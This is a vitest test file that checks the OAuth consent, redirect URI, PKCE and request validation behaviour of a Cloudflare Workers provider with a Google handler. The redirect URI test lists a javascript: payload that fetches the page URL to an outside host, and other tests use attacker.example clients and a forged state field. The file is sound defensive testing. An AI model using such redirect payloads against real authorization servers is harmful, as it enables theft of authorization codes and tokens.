/**
 * End-to-end tests of /register and /authorize through the real
 * workers-oauth-provider, with GoogleHandler as its default handler and an
 * in-memory KV. These exercise the provider's validation and consent
 * helpers together with our handler, which the mocked tests in
 * google-handler.test.ts cannot.
 */

import { describe, it, expect, beforeEach } from 'vitest';
import OAuthProvider from '@cloudflare/workers-oauth-provider';
import { GoogleHandler } from '../google-handler';
import { MemoryKV } from './support/memory-kv';

const ORIGIN = 'https://mcp.example.com';
// S256 challenge for the RFC 7636 appendix B verifier.
const CODE_CHALLENGE = 'E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM';

let kv: MemoryKV;

function makeProvider() {
  return new OAuthProvider({
    apiRoute: '/sse',
    apiHandler: { fetch: async () => new Response('api') },
    // Hono's app type is wider than ExportedHandler; same cast as src/index.ts.
    defaultHandler: GoogleHandler as any,
    authorizeEndpoint: '/authorize',
    tokenEndpoint: '/token',
    clientRegistrationEndpoint: '/register',
    resourceMetadata: { resource: ORIGIN },
  });
}

function env() {
  return {
    OAUTH_KV: kv,
    GOOGLE_CLIENT_ID: 'google-client-id',
    GOOGLE_CLIENT_SECRET: 'google-client-secret',
    COOKIE_ENCRYPTION_KEY: 'test-cookie-secret-0123456789abcdef0123456789',
  };
}

const ctx = { waitUntil: () => {}, passThroughOnException: () => {}, props: {} };

function send(path: string, init: RequestInit = {}): Promise<Response> {
  return makeProvider().fetch(new Request(`${ORIGIN}${path}`, init), env() as any, ctx as any);
}

async function register(metadata: Record<string, unknown>): Promise<Response> {
  return send('/register', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token_endpoint_auth_method: 'none', ...metadata }),
  });
}

async function registerClient(redirectUri: string, clientName = 'Friendly Notes'): Promise<string> {
  const res = await register({ redirect_uris: [redirectUri], client_name: clientName });
  expect(res.status).toBe(201);
  return ((await res.json()) as { client_id: string }).client_id;
}

function authorizeQuery(clientId: string, redirectUri: string, overrides: Record<string, string | null> = {}) {
  const params: Record<string, string | null> = {
    response_type: 'code',
    client_id: clientId,
    redirect_uri: redirectUri,
    code_challenge: CODE_CHALLENGE,
    code_challenge_method: 'S256',
    state: 'client-state',
    ...overrides,
  };
  const query = new URLSearchParams();
  for (const [key, value] of Object.entries(params)) {
    if (value !== null) query.set(key, value);
  }
  return `/authorize?${query}`;
}

/** Turn Set-Cookie headers into a Cookie request header. */
function cookiesFrom(res: Response): string {
  return res.headers.getSetCookie().map((cookie) => cookie.split(';')[0]).join('; ');
}

function handleFrom(html: string): string {
  const match = html.match(/name="handle" value="([^"]+)"/);
  expect(match).not.toBeNull();
  return match![1];
}

function consentPost(handle: string, decision: string, cookie?: string): Promise<Response> {
  const headers: Record<string, string> = { 'Content-Type': 'application/x-www-form-urlencoded' };
  if (cookie) headers.Cookie = cookie;
  return send('/authorize', {
    method: 'POST',
    headers,
    body: new URLSearchParams({ handle, decision }).toString(),
  });
}

beforeEach(() => {
  kv = new MemoryKV();
});

describe('consent screen (A1)', () => {
  it('shows a consent screen naming the client and the redirect host instead of going to Google', async () => {
    const clientId = await registerClient('https://attacker.example/cb', 'Keystone <b>Official</b>');

    const res = await send(authorizeQuery(clientId, 'https://attacker.example/cb'));
    const html = await res.text();

    expect(res.status).toBe(200);
    expect(html).not.toContain('accounts.google.com');
    expect(html).toContain('attacker.example');
    // Client-chosen name is escaped, never rendered as markup.
    expect(html).toContain('Keystone &#60;b&#62;Official&#60;/b&#62;');
    expect(html).not.toContain('<b>Official</b>');
    expect(res.headers.get('X-Frame-Options')).toBe('DENY');
    expect(res.headers.get('Content-Security-Policy')).toContain("frame-ancestors 'none'");
  });

  it('warns when access goes to an app on the local machine', async () => {
    const clientId = await registerClient('http://localhost:5555/cb');
    const html = await (await send(authorizeQuery(clientId, 'http://localhost:5555/cb'))).text();
    expect(html).toContain('app on your computer');
  });

  it('continues to Google only after the user approves, and remembers the approval', async () => {
    const redirectUri = 'https://app.example/cb';
    const clientId = await registerClient(redirectUri);

    const page = await send(authorizeQuery(clientId, redirectUri));
    const approve = await consentPost(handleFrom(await page.text()), 'approve', cookiesFrom(page));

    expect(approve.status).toBe(200);
    expect(await approve.text()).toContain('https://accounts.google.com/o/oauth2/v2/auth');
    const approvalCookie = approve.headers.getSetCookie().find((c) => c.startsWith('__Host-oauth-approvals='));
    expect(approvalCookie).toBeDefined();

    // Same browser, same client: straight to Google, no second consent screen.
    const again = await send(authorizeQuery(clientId, redirectUri), {
      headers: { Cookie: approvalCookie!.split(';')[0] },
    });
    expect(await again.text()).toContain('https://accounts.google.com/o/oauth2/v2/auth');
  });

  it('does not let an approval for one client cover another client', async () => {
    const trusted = await registerClient('https://app.example/cb');
    const other = await registerClient('https://attacker.example/cb');

    const page = await send(authorizeQuery(trusted, 'https://app.example/cb'));
    const approve = await consentPost(handleFrom(await page.text()), 'approve', cookiesFrom(page));
    const approvalCookie = approve.headers.getSetCookie().find((c) => c.startsWith('__Host-oauth-approvals='))!;

    const res = await send(authorizeQuery(other, 'https://attacker.example/cb'), {
      headers: { Cookie: approvalCookie.split(';')[0] },
    });
    const html = await res.text();
    expect(html).not.toContain('accounts.google.com');
    expect(html).toContain('name="handle"');
  });

  it('refuses an approval posted without the browser-binding cookie (cross-site form post)', async () => {
    const clientId = await registerClient('https://attacker.example/cb');
    const page = await send(authorizeQuery(clientId, 'https://attacker.example/cb'));

    const res = await consentPost(handleFrom(await page.text()), 'approve');

    expect(res.status).toBe(400);
    expect(await res.text()).not.toContain('accounts.google.com');
  });

  it('refuses a consent handle that was already used', async () => {
    const clientId = await registerClient('https://app.example/cb');
    const page = await send(authorizeQuery(clientId, 'https://app.example/cb'));
    const handle = handleFrom(await page.text());
    const cookie = cookiesFrom(page);

    expect((await consentPost(handle, 'approve', cookie)).status).toBe(200);
    expect((await consentPost(handle, 'approve', cookie)).status).toBe(400);
  });

  it('sends access_denied back to the client when the user denies', async () => {
    const clientId = await registerClient('https://app.example/cb');
    const page = await send(authorizeQuery(clientId, 'https://app.example/cb'));

    const res = await consentPost(handleFrom(await page.text()), 'deny', cookiesFrom(page));

    expect(res.status).toBe(302);
    const location = new URL(res.headers.get('Location')!);
    expect(location.origin + location.pathname).toBe('https://app.example/cb');
    expect(location.searchParams.get('error')).toBe('access_denied');
    expect(location.searchParams.get('state')).toBe('client-state');
  });
});

describe('redirect URI policy (A2)', () => {
  it('refuses to register script-capable or remote-http redirect URIs', async () => {
    for (const uri of [
      "javascript://localhost/%0Afetch('https://x/'+location.href)//",
      'javascript:alert(1)',
      'data:text/html,hi',
      'http://attacker.example/cb',
      'https://app.example/cb#fragment',
      'https://user:pass@app.example/cb',
    ]) {
      const res = await register({ redirect_uris: [uri] });
      expect(res.status, uri).toBe(400);
    }
  });

  it('accepts https and loopback http redirect URIs', async () => {
    for (const uri of ['https://app.example/cb', 'http://localhost:5555/cb', 'http://127.0.0.1:5555/cb']) {
      const res = await register({ redirect_uris: [uri] });
      expect(res.status, uri).toBe(201);
    }
  });

  it('refuses to authorize with a non-compliant URI registered next to a compliant one', async () => {
    const res = await register({ redirect_uris: ['https://app.example/cb', 'cursor://anysphere.cursor-mcp/oauth/callback'] });
    const { client_id: clientId } = (await res.json()) as { client_id: string };

    const authorize = await send(authorizeQuery(clientId, 'cursor://anysphere.cursor-mcp/oauth/callback'));
    expect(authorize.status).toBe(400);
    expect(authorize.headers.get('Location')).toBeNull();
  });
});

describe('PKCE (A6)', () => {
  function errorOf(res: Response) {
    expect(res.status).toBe(302);
    return new URL(res.headers.get('Location')!).searchParams;
  }

  it('advertises S256 only', async () => {
    const metadata = (await (await send('/.well-known/oauth-authorization-server')).json()) as {
      code_challenge_methods_supported: string[];
    };
    expect(metadata.code_challenge_methods_supported).toEqual(['S256']);
  });

  it('refuses code_challenge_method=plain', async () => {
    const clientId = await registerClient('https://app.example/cb');
    const res = await send(authorizeQuery(clientId, 'https://app.example/cb', {
      code_challenge: 'plain-verifier-value-that-is-long-enough-1234567',
      code_challenge_method: 'plain',
    }));
    expect(errorOf(res).get('error')).toBe('invalid_request');
  });

  it('refuses a public client without PKCE', async () => {
    const clientId = await registerClient('https://app.example/cb');
    const res = await send(authorizeQuery(clientId, 'https://app.example/cb', {
      code_challenge: null, code_challenge_method: null,
    }));
    expect(errorOf(res).get('error')).toBe('invalid_request');
  });

  it('refuses a confidential client without PKCE', async () => {
    const reg = await register({
      redirect_uris: ['https://app.example/cb'],
      token_endpoint_auth_method: 'client_secret_basic',
    });
    expect(reg.status).toBe(201);
    const { client_id: clientId } = (await reg.json()) as { client_id: string };

    const res = await send(authorizeQuery(clientId, 'https://app.example/cb', {
      code_challenge: null, code_challenge_method: null,
    }));
    const params = errorOf(res);
    expect(params.get('error')).toBe('invalid_request');
    expect(params.get('error_description')).toContain('S256');
    expect(params.get('state')).toBe('client-state');
  });
});

describe('POST /authorize no longer signs form-supplied requests (A5)', () => {
  it('rejects the old base64 `state` form field', async () => {
    const clientId = await registerClient('https://app.example/cb');
    const forged = btoa(JSON.stringify({
      oauthReqInfo: { responseType: 'token', clientId, redirectUri: 'https://app.example/cb', scope: [], state: 'x' },
    }));

    const res = await send('/authorize', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({ state: forged }).toString(),
    });

    expect(res.status).toBe(400);
    expect(await res.text()).not.toContain('accounts.google.com');
  });

  it('rejects an unknown handle', async () => {
    const res = await consentPost('made-up-handle', 'approve', '__Host-oauth-consent-x=y');
    expect(res.status).toBe(400);
  });
});

describe('authorization request validation', () => {
  it('renders an error, without redirecting, for an unregistered redirect URI', async () => {
    const clientId = await registerClient('https://app.example/cb');
    const res = await send(authorizeQuery(clientId, 'https://attacker.example/cb'));
    expect(res.status).toBe(400);
    expect(res.headers.get('Location')).toBeNull();
  });

  it('accepts a registered loopback redirect URI on another port without rewriting the registration (A3)', async () => {
    const clientId = await registerClient('http://localhost:5555/cb');
    const before = JSON.stringify([...kv.entries.entries()].filter(([key]) => key.startsWith('client:')));

    const res = await send(authorizeQuery(clientId, 'http://localhost:6666/cb'));

    expect(res.status).toBe(200);
    expect(await res.text()).toContain('localhost');
    const after = JSON.stringify([...kv.entries.entries()].filter(([key]) => key.startsWith('client:')));
    expect(after).toBe(before);
  });

  it('refuses the implicit grant (response_type=token)', async () => {
    const clientId = await registerClient('https://app.example/cb');
    const res = await send(authorizeQuery(clientId, 'https://app.example/cb', { response_type: 'token' }));
    expect(res.status).toBe(302);
    expect(new URL(res.headers.get('Location')!).searchParams.get('error')).toBe('unsupported_response_type');
  });
});
